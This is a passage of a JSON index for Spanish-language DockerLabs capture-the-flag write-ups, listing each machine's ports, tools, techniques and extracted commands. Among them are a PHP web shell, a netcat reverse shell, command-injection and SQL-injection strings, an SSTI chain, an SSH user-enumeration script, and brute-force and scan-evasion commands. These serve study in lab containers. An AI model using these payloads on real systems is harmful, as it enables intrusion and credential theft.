+          "stty raw -echo; fg",
+          "export TERM=xterm\nexport SHELL=/bin/bash"
+        ],
+        "word_count": 1990,
+        "image_count": 26,
+        "needs_review": false
+      },
+      {
+        "id": "verdejo",
+        "label": "Verdejo",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Verdejo.md",
+        "page_path": "machines/dockerlabs/facil/verdejo.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80,
+          8089,
+          12345
+        ],
+        "services": [
+          "apache",
+          "http",
+          "joomla",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "base64",
+          "burp-suite",
+          "grep",
+          "gtfobins",
+          "john-the-ripper",
+          "netcat",
+          "nmap",
+          "ping",
+          "python",
+          "ruby",
+          "ssh",
+          "sudo",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "cms-exploitation",
+          "connectivity-check",
+          "credential-extraction",
+          "hash-cracking",
+          "malicious-file-upload",
+          "metadata-analysis",
+          "port-enumeration",
+          "rce",
+          "ssti",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "insecure-file-upload",
+          "secret-in-metadata",
+          "suid-misconfiguration",
+          "unsanitized-user-input",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "hash-cracking-to-root",
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "from flask import Flask, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello():\n    nombre = request.args.get('nombre', 'Invitado')\n    plantilla = f\"<h1>Hola, {nombre}!</h1>\"  # PARTE VULNERABLE A SSTI\n    return render_template_string(plantilla)",
+          "' '",
+          "' '.__class__",
+          "' '.__class__.__mro__",
+          "' '.__class__.__mro__[1]",
+          "' '.__class__.__mro__[1].__subclasses__()"
+        ],
+        "word_count": 2622,
+        "image_count": 37,
+        "needs_review": false
+      },
+      {
+        "id": "vulnvault",
+        "label": "Vulnvault",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Vulnvault.md",
+        "page_path": "machines/dockerlabs/facil/vulnvault.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "http",
+          "joomla",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "base64",
+          "grep",
+          "nmap",
+          "ping",
+          "python",
+          "ruby",
+          "ssh",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "cms-exploitation",
+          "connectivity-check",
+          "credential-extraction",
+          "lfi",
+          "port-enumeration",
+          "rce",
+          "suid-abuse",
+          "tty-stabilization",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "insecure-file-upload",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "script /dev/null -c bash",
+          "stty raw -echo; fg",
+          "export TERM=xterm\nexport SHELL=/bin/bash",
+          "generate_report --name \"reporte1; id\" --date \"22/02/2024; whoami\""
+        ],
+        "word_count": 2039,
+        "image_count": 27,
+        "needs_review": false
+      },
+      {
+        "id": "where-is-my-web-shell",
+        "label": "Where Is My Web Shell",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Faciles/Where Is My Web Shell.md",
+        "page_path": "machines/dockerlabs/facil/where-is-my-web-shell.md",
+        "platform": "dockerlabs",
+        "difficulty": "facil",
+        "os": "linux",
+        "ports": [
+          1234
+        ],
+        "services": [
+          "apache",
+          "http",
+          "php"
+        ],
+        "tools": [
+          "ffuf-wfuzz",
+          "gobuster",
+          "netcat",
+          "nmap",
+          "ping",
+          "whatweb"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "credential-extraction",
+          "malicious-file-upload",
+          "port-enumeration",
+          "rce",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "insecure-file-upload",
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [
+          "<?php\necho \"<pre>\" . shell_exec($_REQUEST[\"parametro__cualquiera\"]) . \"</pre>\";\n?>",
+          "http://URL/archivo.php?parámetro=valor_del_parametro”"
+        ],
+        "word_count": 1567,
+        "image_count": 21,
+        "needs_review": false
+      },
+      {
+        "id": "borazuwarahctf",
+        "label": "BorazuwarahCTF",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/BorazuwarahCTF.md",
+        "page_path": "machines/dockerlabs/muy-facil/borazuwarahctf.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "ftp",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "exiftool",
+          "nmap",
+          "ping",
+          "ssh",
+          "strings",
+          "sudo",
+          "wget"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "connectivity-check",
+          "credential-extraction",
+          "metadata-analysis",
+          "port-enumeration",
+          "steganography",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "secret-in-metadata",
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [],
+        "word_count": 550,
+        "image_count": 10,
+        "needs_review": false
+      },
+      {
+        "id": "breakmyssh",
+        "label": "BreakMySSH",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/BreakMySSH.md",
+        "page_path": "machines/dockerlabs/muy-facil/breakmyssh.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [],
+        "services": [
+          "ftp",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "curl",
+          "find",
+          "grep",
+          "hydra",
+          "nmap",
+          "python",
+          "searchsploit",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "credential-extraction",
+          "hash-cracking",
+          "metadata-analysis",
+          "port-enumeration",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "secret-in-metadata",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "hash-cracking-to-root"
+        ],
+        "commands": [
+          "sudo apt install python2",
+          "curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py\nsudo python2 get-pip.py\npip2 --version",
+          "pip2 install paramiko==2.4.2",
+          "#!/bin/bash\nip=\"$2\"\nport=\"$1\"\nMAX_JOBS=10\nsem(){\n\twhile [ \"$(jobs -r | wc -l)\" -ge \"$MAX_JOBS\" ]; do\n\t\tsleep 0.2\n\tdone\n}\nwhile read user; do\n\tsem\n\t(\n\t\tresult=$(python2 45939.py -p \"$port\" \"$ip\" \"$user\" 2>/dev/null)\n\t\tif echo \"$result\" | grep -q \"\\[+\\]\"; then\n\t\t\techo \"$user\"\n\t\tfi\n\t) &\ndone < user.txt_\n\nwait",
+          "ssh-keygen -f \"/home/bandit0/.ssh/known_hosts\" -R \"172.17.0.2\""
+        ],
+        "word_count": 1369,
+        "image_count": 17,
+        "needs_review": false
+      },
+      {
+        "id": "firsthacking",
+        "label": "FirstHacking",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/FirstHacking.md",
+        "page_path": "machines/dockerlabs/muy-facil/firsthacking.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          21,
+          6200
+        ],
+        "services": [
+          "ftp"
+        ],
+        "tools": [
+          "netcat",
+          "nmap",
+          "searchsploit"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "credential-extraction",
+          "metadata-analysis",
+          "port-enumeration",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "secret-in-metadata",
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [
+          "printf “USER bandit:)\\r\\nPASS pass\\r\\n” | nc 172.17.0.2 && sleep 1 && nc 172.17.0.2 6200"
+        ],
+        "word_count": 611,
+        "image_count": 10,
+        "needs_review": false
+      },
+      {
+        "id": "hedgehog",
+        "label": "HedgeHog",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/HedgeHog.md",
+        "page_path": "machines/dockerlabs/muy-facil/hedgehog.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          80
+        ],
+        "services": [
+          "ftp",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "nmap",
+          "ping",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "connectivity-check",
+          "credential-extraction",
+          "port-enumeration",
+          "sudo-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "sudo-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "sudo-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 573,
+        "image_count": 11,
+        "needs_review": false
+      },
+      {
+        "id": "injection",
+        "label": "Injection",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/Injection.md",
+        "page_path": "machines/dockerlabs/muy-facil/injection.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          80
+        ],
+        "services": [
+          "apache",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "find",
+          "nmap",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "credential-extraction",
+          "login-bypass",
+          "port-enumeration",
+          "sql-injection",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "exposed-error-message",
+          "suid-misconfiguration",
+          "unsanitized-user-input",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "suid-binary-abuse"
+        ],
+        "commands": [
+          "SELECT * FROM usuarios WHERE usuario = 'tu usuario' AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ ’ AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ OR 1=1-- - ’ AND password = 'tu contraseña';",
+          "SELECT * FROM usuarios WHERE usuario = ‘’ OR 1=1;"
+        ],
+        "word_count": 1007,
+        "image_count": 12,
+        "needs_review": false
+      },
+      {
+        "id": "obsession",
+        "label": "Obsession",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/Obsession.md",
+        "page_path": "machines/dockerlabs/muy-facil/obsession.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [],
+        "services": [
+          "ftp",
+          "http"
+        ],
+        "tools": [
+          "nmap",
+          "ping",
+          "sudo",
+          "vim"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "connectivity-check",
+          "credential-extraction",
+          "port-enumeration",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "weak-credentials"
+        ],
+        "privilege_methods": [],
+        "commands": [],
+        "word_count": 626,
+        "image_count": 11,
+        "needs_review": false
+      },
+      {
+        "id": "tproot",
+        "label": "Tproot",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/Tproot.md",
+        "page_path": "machines/dockerlabs/muy-facil/tproot.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          21,
+          6200
+        ],
+        "services": [
+          "ftp"
+        ],
+        "tools": [
+          "netcat",
+          "nmap",
+          "ping",
+          "searchsploit"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "connectivity-check",
+          "port-enumeration"
+        ],
+        "vulnerabilities": [],
+        "privilege_methods": [],
+        "commands": [],
+        "word_count": 460,
+        "image_count": 8,
+        "needs_review": false
+      },
+      {
+        "id": "trust",
+        "label": "Trust",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/Trust.md",
+        "page_path": "machines/dockerlabs/muy-facil/trust.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "ftp",
+          "http",
+          "php",
+          "ssh"
+        ],
+        "tools": [
+          "ffuf-wfuzz",
+          "gobuster",
+          "gtfobins",
+          "hydra",
+          "nmap",
+          "searchsploit",
+          "ssh",
+          "sudo",
+          "vim"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "credential-extraction",
+          "port-enumeration",
+          "sudo-abuse",
+          "suid-abuse",
+          "web-enumeration"
+        ],
+        "vulnerabilities": [
+          "sudo-misconfiguration",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "sudo-binary-abuse",
+          "suid-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 1056,
+        "image_count": 13,
+        "needs_review": false
+      },
+      {
+        "id": "vacaciones",
+        "label": "Vacaciones",
+        "source_path": "Maquinas De Dockerlabs/Maquinas Muy Faciles/Vacaciones.md",
+        "page_path": "machines/dockerlabs/muy-facil/vacaciones.md",
+        "platform": "dockerlabs",
+        "difficulty": "muy-facil",
+        "os": "linux",
+        "ports": [
+          22,
+          80
+        ],
+        "services": [
+          "apache",
+          "http",
+          "ssh"
+        ],
+        "tools": [
+          "gtfobins",
+          "nmap",
+          "ruby",
+          "ssh",
+          "sudo"
+        ],
+        "mentioned_tools": [],
+        "techniques": [
+          "brute-force",
+          "credential-extraction",
+          "port-enumeration",
+          "sudo-abuse",
+          "suid-abuse"
+        ],
+        "vulnerabilities": [
+          "sudo-misconfiguration",
+          "suid-misconfiguration",
+          "weak-credentials"
+        ],
+        "privilege_methods": [
+          "sudo-binary-abuse",
+          "suid-binary-abuse"
+        ],
+        "commands": [],
+        "word_count": 361,
+        "image_count": 12,
+        "needs_review": false
+      }
+    ],
+    "techniques": [
+      {
+        "id": "api-abuse",
+        "label": "API abuse"
+      },
+      {
+        "id": "brute-force",
+        "label": "Brute force"
+      },
+      {
+        "id": "cms-exploitation",
+        "label": "CMS exploitation"
+      },
+      {
+        "id": "command-injection",
+        "label": "Command Injection"
+      },
+      {
+        "id": "connectivity-check",
+        "label": "Connectivity check"
+      },
+      {
+        "id": "credential-extraction",
+        "label": "Credential extraction"
+      },
+      {
+        "id": "hash-cracking",
+        "label": "Hash cracking"
+      },
+      {
+        "id": "lfi",
+        "label": "Local File Inclusion"
+      },
+      {
+        "id": "login-bypass",
+        "label": "Login bypass"
+      },
+      {
+        "id": "malicious-file-upload",
+        "label": "Malicious file upload"
+      },
+      {
+        "id": "metadata-analysis",
+        "label": "Metadata analysis"
+      },
+      {
+        "id": "port-enumeration",
+        "label": "Port enumeration"
+      },
+      {
+        "id": "process-abuse",
+        "label": "Process abuse"
+      },
+      {
+        "id": "python-library-hijacking",
+        "label": "Python Library Hijacking"
+      },
+      {
+        "id": "rce",
+        "label": "Remote Code Execution"
+      },
+      {
+        "id": "sql-injection",
+        "label": "SQL Injection"
+      },
+      {
+        "id": "ssti",
+        "label": "SSTI"
+      },
+      {
+        "id": "steganography",
+        "label": "Steganography"
+      },
+      {
+        "id": "sudo-abuse",
+        "label": "sudo abuse"
+      },
+      {
+        "id": "suid-abuse",
+        "label": "SUID abuse"
+      },
+      {
+        "id": "tty-stabilization",
+        "label": "TTY stabilization"
+      },
+      {
+        "id": "web-enumeration",
+        "label": "Web enumeration"
+      }
+    ],
+    "tools": [
+      {
+        "id": "base64",
+        "label": "base64"
+      },
+      {
+        "id": "burp-suite",
+        "label": "Burp Suite"
+      },
+      {
+        "id": "ciberchef",
+        "label": "CiberChef"
+      },
+      {
+        "id": "crackmapexec",
+        "label": "CrackMapExec"
+      },
+      {
+        "id": "curl",
+        "label": "curl"
+      },
+      {
+        "id": "dd",
+        "label": "dd"
+      },
+      {
+        "id": "env",
+        "label": "env"
+      },
+      {
+        "id": "exiftool",
+        "label": "ExifTool"
+      },
+      {
+        "id": "ffuf-wfuzz",
+        "label": "FFUF / WFuzz"
+      },
+      {
+        "id": "find",
+        "label": "find"
+      },
+      {
+        "id": "gobuster",
+        "label": "Gobuster"
+      },
+      {
+        "id": "grep",
+        "label": "grep"
+      },
+      {
+        "id": "gtfobins",
+        "label": "GTFOBins"
+      },
+      {
+        "id": "hydra",
+        "label": "Hydra"
+      },
+      {
+        "id": "john-the-ripper",
+        "label": "John the Ripper"
+      },
+      {
+        "id": "nano",
+        "label": "nano"
+      },
+      {
+        "id": "netcat",
+        "label": "Netcat"
+      },
+      {
+        "id": "nmap",
+        "label": "Nmap"
+      },
+      {
+        "id": "nodejs",
+        "label": "Node.js"
+      },
+      {
+        "id": "ping",
+        "label": "Ping"
+      },
+      {
+        "id": "python",
+        "label": "Python"
+      },
+      {
+        "id": "rpcclient",
+        "label": "rpcclient"
+      },
+      {
+        "id": "ruby",
+        "label": "Ruby"
+      },
+      {
+        "id": "searchsploit",
+        "label": "Searchsploit"
+      },
+      {
+        "id": "sqlmap",
+        "label": "SQLMap"
+      },
+      {
+        "id": "ssh",
+        "label": "ssh"
+      },
+      {
+        "id": "steghide",
+        "label": "steghide"
+      },
+      {
+        "id": "strings",
+        "label": "strings"
+      },
+      {
+        "id": "sudo",
+        "label": "sudo"
+      },
+      {
+        "id": "vim",
+        "label": "Vim"
+      },
+      {
+        "id": "wget",
+        "label": "wget"
+      },
+      {
+        "id": "whatweb",
+        "label": "WhatWeb"
+      }
+    ],
+    "services": [
+      {
+        "id": "apache",
+        "label": "Apache"
+      },
+      {
+        "id": "api",
+        "label": "API"
+      },
+      {
+        "id": "ftp",
+        "label": "FTP"
+      },
+      {
+        "id": "grafana",
+        "label": "Grafana"
+      },
+      {
+        "id": "http",
+        "label": "HTTP"
+      },
+      {
+        "id": "jenkins",
+        "label": "Jenkins"
+      },
+      {
+        "id": "joomla",
+        "label": "Joomla"
+      },
+      {
+        "id": "mariadb-mysql",
+        "label": "MariaDB / MySQL"
+      },
+      {
+        "id": "nginx",
+        "label": "Nginx"
+      },
+      {
+        "id": "nodejs-service",
+        "label": "Node.js service"
+      },
+      {
+        "id": "php",
+        "label": "PHP"
+      },
+      {
+        "id": "smb",
+        "label": "SMB / Samba"
+      },
+      {
+        "id": "ssh",
+        "label": "SSH"
+      },
+      {
+        "id": "tomcat",
+        "label": "Tomcat"
+      }
+    ],
+    "vulnerabilities": [
+      {
+        "id": "exposed-error-message",
+        "label": "Exposed error message"
+      },
+      {
+        "id": "insecure-file-upload",
+        "label": "Insecure file upload"
+      },
+      {
+        "id": "secret-in-metadata",
+        "label": "Secret in metadata"
+      },
+      {
+        "id": "sudo-misconfiguration",
+        "label": "sudo misconfiguration"
+      },
+      {
+        "id": "suid-misconfiguration",
+        "label": "SUID misconfiguration"
+      },
+      {
+        "id": "unsanitized-user-input",
+        "label": "Unsanitized user input"
+      },
+      {
+        "id": "weak-credentials",
+        "label": "Weak credentials"
+      }
+    ],
+    "privilege_methods": [
+      {
+        "id": "hash-cracking-to-root",
+        "label": "Hash cracking to root"
+      },
+      {
+        "id": "process-abuse",
+        "label": "Process abuse"
+      },
+      {
+        "id": "python-library-hijacking",
+        "label": "Python Library Hijacking"
+      },
+      {
+        "id": "sudo-binary-abuse",
+        "label": "sudo binary abuse"
+      },
+      {
+        "id": "suid-binary-abuse",
+        "label": "SUID binary abuse"
+      }
+    ]
+  },
+  "source_notes": [
+    {
+      "id": "base64",
+      "label": "Base64",
+      "source_path": "Conceptos Y Herramientas/Base64.md",
+      "techniques": [],
+      "tools": [
+        "base64"
+      ],
+      "services": [],
+      "commands": [
+        "Tabla_de_base64=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\""
+      ]
+    },
+    {
+      "id": "ciberchef",
+      "label": "CiberChef",
+      "source_path": "Conceptos Y Herramientas/CiberChef.md",
+      "techniques": [
+        "metadata-analysis"
+      ],
+      "tools": [
+        "base64",
+        "ciberchef"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "crackmapexec",
+      "label": "CrackMapExec",
+      "source_path": "Conceptos Y Herramientas/CrackMapExec.md",
+      "techniques": [
+        "credential-extraction",
+        "hash-cracking",
+        "web-enumeration"
+      ],
+      "tools": [
+        "crackmapexec"
+      ],
+      "services": [
+        "smb"
+      ],
+      "commands": []
+    },
+    {
+      "id": "escaneo-con-nmap",
+      "label": "Escaneo Con Nmap",
+      "source_path": "Conceptos Y Herramientas/Escaneo Con Nmap.md",
+      "techniques": [
+        "connectivity-check",
+        "port-enumeration"
+      ],
+      "tools": [
+        "nmap",
+        "ping",
+        "sudo"
+      ],
+      "services": [],
+      "commands": [
+        "torsocks nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 172.17.0.2",
+        "torsocks nmap -sT -Pn -n --scan-delay 10s --proxy socks5://127.0.0.1:9050 172.17.0.2",
+        "sudo nmap -S 172.17.0.5 --spoof-mac 0 -e Docker0 -Pn 172.17.0.2",
+        "proxychains nmap -sT -Pn -n -T2 172.17.0.2",
+        "sudo nmap -sU --data-length 24 --badsum -Pn -f 172.17.0.2",
+        "nmap -PE -PP -PM -Pn --disable-arp-ping --packet-trace 172.17.0.2"
+      ]
+    },
+    {
+      "id": "esteganografia-a-bajo-nivel",
+      "label": "Esteganografia A Bajo Nivel",
+      "source_path": "Conceptos Y Herramientas/Esteganografía/Esteganografia A Bajo Nivel.md",
+      "techniques": [
+        "steganography"
+      ],
+      "tools": [
+        "python"
+      ],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "esteganografia-con-python-en-imagen",
+      "label": "Esteganografía con Python en Imagen",
+      "source_path": "Conceptos Y Herramientas/Esteganografía/Esteganografía con Python en Imagen.md",
+      "techniques": [
+        "credential-extraction",
+        "steganography"
+      ],
+      "tools": [
+        "python"
+      ],
+      "services": [],
+      "commands": [
+        "def extractor_de_idat(png_bytes):\n    chunks = []\n    i = 8",
+        "while i < len(png_bytes):\n        length = int.from_bytes(png_bytes[i:i+4], byteorder='big')\n        chunk_type = png_bytes[i+4:i+8]",
+        "if chunk_type == b'IDAT':\n            chunk_data = png_bytes[i+8:i+8+length]\n            chunks.append(chunk_data)",
+        "i += 4 + 4 + length + 4",
+        "return b''.join(chunks)"
+      ]
+    },
+    {
+      "id": "esteganografia",
+      "label": "Esteganografía",
+      "source_path": "Conceptos Y Herramientas/Esteganografía/Esteganografía.md",
+      "techniques": [
+        "lfi",
+        "steganography"
+      ],
+      "tools": [],
+      "services": [
+        "php"
+      ],
+      "commands": []
+    },
+    {
+      "id": "fuerza-bruta-con-hydra",
+      "label": "Fuerza bruta con Hydra",
+      "source_path": "Conceptos Y Herramientas/Fuerza bruta con Hydra.md",
+      "techniques": [
+        "brute-force",
+        "credential-extraction",
+        "hash-cracking",
+        "web-enumeration"
+      ],
+      "tools": [
+        "hydra",
+        "ssh"
+      ],
+      "services": [
+        "ftp",
+        "http",
+        "smb",
+        "ssh"
+      ],
+      "commands": [
+        "hydra -l admin -x \"4:6:aA1?*^\" ssh://172.17.0.2",
+        "hydra http-post-form -L users.txt -P pass.txt \\\n\"172.17.0.2/login:user=^USER^&pass=^PASS^:F=error\" \\\n-s 443 -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0)\" \\\n-H \"X-Forwarded-For: 1.2.3.4\" -t 3",
+        "hashcat -a 6 -m 0 ?a?a?a?a --stdout | hydra -l admin -P - http-post-form \"172.17.0.2/login:user=^USER^&pass=^PASS^\""
+      ]
+    },
+    {
+      "id": "fuzzing-web",
+      "label": "Fuzzing Web",
+      "source_path": "Conceptos Y Herramientas/Fuzzing Web.md",
+      "techniques": [
+        "brute-force",
+        "malicious-file-upload",
+        "web-enumeration"
+      ],
+      "tools": [
+        "ffuf-wfuzz",
+        "gobuster"
+      ],
+      "services": [
+        "http",
+        "php"
+      ],
+      "commands": []
+    },
+    {
+      "id": "listado-de-procesos",
+      "label": "Listado De procesos",
+      "source_path": "Conceptos Y Herramientas/Listado De procesos.md",
+      "techniques": [
+        "credential-extraction",
+        "web-enumeration"
+      ],
+      "tools": [],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "rpcclient",
+      "label": "Rpcclient",
+      "source_path": "Conceptos Y Herramientas/Rpcclient.md",
+      "techniques": [
+        "credential-extraction",
+        "web-enumeration"
+      ],
+      "tools": [
+        "rpcclient"
+      ],
+      "services": [
+        "smb"
+      ],
+      "commands": []
+    },
+    {
+      "id": "searchsploit",
+      "label": "Searchsploit",
+      "source_path": "Conceptos Y Herramientas/Searchsploit.md",
+      "techniques": [
+        "metadata-analysis",
+        "web-enumeration"
+      ],
+      "tools": [
+        "searchsploit",
+        "ssh"
+      ],
+      "services": [
+        "ssh"
+      ],
+      "commands": []
+    },
+    {
+      "id": "tratamiento-de-la-tty",
+      "label": "Tratamiento De La TTY",
+      "source_path": "Conceptos Y Herramientas/Tratamiento De La TTY.md",
+      "techniques": [
+        "malicious-file-upload",
+        "tty-stabilization"
+      ],
+      "tools": [
+        "netcat",
+        "python"
+      ],
+      "services": [],
+      "commands": [
+        "script /dev/null -c bash",
+        "stty raw -echo; fg",
+        "export TERM=xterm\nexport SHELL=/bin/bash",
+        "/bin/bash -i",
+        "perl -e 'exec \"/bin/bash\";'",
+        "nc -e /bin/bash 172.17.0.1 1234"
+      ]
+    },
+    {
+      "id": "verificar-conexion",
+      "label": "Verificar conexión",
+      "source_path": "Conceptos Y Herramientas/Verificar conexión.md",
+      "techniques": [
+        "connectivity-check",
+        "port-enumeration"
+      ],
+      "tools": [
+        "nmap",
+        "ping"
+      ],
+      "services": [],
+      "commands": [
+        "traceroute 192.168.1.1"
+      ]
+    },
+    {
+      "id": "vista-en-tiempo-real-de-comandos",
+      "label": "Vista en tiempo real de comandos",
+      "source_path": "Conceptos Y Herramientas/Vista en tiempo real de comandos.md",
+      "techniques": [
+        "credential-extraction"
+      ],
+      "tools": [
+        "grep",
+        "python"
+      ],
+      "services": [],
+      "commands": [
+        "watch -d 'tail -n 20 /var/log/syslog'",
+        "watch -n 1 'free -h'",
+        "watch -d 'df -h | grep -v tmpfs'",
+        "watch -d 'who'",
+        "watch -n 1 'lsof -p $(pgrep python)'"
+      ]
+    },
+    {
+      "id": "whatweb",
+      "label": "WhatWeb",
+      "source_path": "Conceptos Y Herramientas/WhatWeb.md",
+      "techniques": [
+        "cms-exploitation",
+        "web-enumeration"
+      ],
+      "tools": [
+        "ruby",
+        "whatweb"
+      ],
+      "services": [
+        "http",
+        "joomla",
+        "php"
+      ],
+      "commands": [
+        "whatweb --no-errors -a 3 --max-threads 50 --open-timeout 5 --read-timeout 5 --follow-redirect=neve http://172.17.0.2",
+        "whatweb -a 1 --max-threads 2 --user-agent \"Mozilla/5.0\" --wait=5 http:172.17.0.2"
+      ]
+    },
+    {
+      "id": "abuso-de-apis",
+      "label": "Abuso De APIs",
+      "source_path": "Explotaciones/Abuso De APIs.md",
+      "techniques": [
+        "api-abuse"
+      ],
+      "tools": [
+        "nodejs"
+      ],
+      "services": [
+        "api",
+        "nodejs-service"
+      ],
+      "commands": []
+    },
+    {
+      "id": "analisis-de-metadatos-y-crackeos",
+      "label": "Análisis De Metadatos y Crackeos",
+      "source_path": "Explotaciones/Análisis De Metadatos y Crackeos.md",
+      "techniques": [
+        "metadata-analysis"
+      ],
+      "tools": [
+        "ssh"
+      ],
+      "services": [
+        "ssh"
+      ],
+      "commands": []
+    },
+    {
+      "id": "command-injection",
+      "label": "Command Injection",
+      "source_path": "Explotaciones/Command Injection.md",
+      "techniques": [
+        "command-injection",
+        "web-enumeration"
+      ],
+      "tools": [],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "joomla",
+      "label": "Joomla",
+      "source_path": "Explotaciones/Gestores De Contenido/Joomla.md",
+      "techniques": [
+        "cms-exploitation",
+        "credential-extraction"
+      ],
+      "tools": [],
+      "services": [
+        "http",
+        "joomla"
+      ],
+      "commands": []
+    },
+    {
+      "id": "lfi",
+      "label": "LFI",
+      "source_path": "Explotaciones/LFI.md",
+      "techniques": [
+        "lfi"
+      ],
+      "tools": [],
+      "services": [
+        "grafana",
+        "jenkins"
+      ],
+      "commands": []
+    },
+    {
+      "id": "rce",
+      "label": "RCE",
+      "source_path": "Explotaciones/RCE.md",
+      "techniques": [
+        "command-injection",
+        "malicious-file-upload",
+        "rce"
+      ],
+      "tools": [],
+      "services": [
+        "http"
+      ],
+      "commands": []
+    },
+    {
+      "id": "sql-injection",
+      "label": "SQL Injection",
+      "source_path": "Explotaciones/SQL Injection.md",
+      "techniques": [
+        "login-bypass",
+        "sql-injection",
+        "web-enumeration"
+      ],
+      "tools": [],
+      "services": [
+        "mariadb-mysql"
+      ],
+      "commands": []
+    },
+    {
+      "id": "ssti",
+      "label": "SSTI",
+      "source_path": "Explotaciones/SSTI.md",
+      "techniques": [
+        "ssti"
+      ],
+      "tools": [],
+      "services": [],
+      "commands": []
+    },
+    {
+      "id": "subida-de-archivos-maliciosos",
+      "label": "Subida de archivos maliciosos",
+      "source_path": "Explotaciones/Subida de archivos maliciosos.md",
+      "techniques": [
+        "cms-exploitation",
+        "malicious-file-upload"
+      ],
+      "tools": [],
+      "services": [
+        "http",
+        "joomla",
+        "php"
+      ],
+      "commands": []
+    },
+    {
+      "id": "grafana",
+      "label": "Grafana",
+      "source_path": "Explotaciones/Tecnologias Explotadas/Grafana.md",
+      "techniques": [
+        "lfi"
+      ],
+      "tools": [],
+      "services": [
+        "grafana"
+      ],
+      "commands": []
+    },
+    {
+      "id": "jenkins",
+      "label": "Jenkins",
+      "source_path": "Explotaciones/Tecnologias Explotadas/Jenkins.md",
+      "techniques": [
+        "lfi"
+      ],
+      "tools": [],
+      "services": [
+        "jenkins"
+      ],
+      "commands": []
+    },
+    {
+      "id": "tomcat",
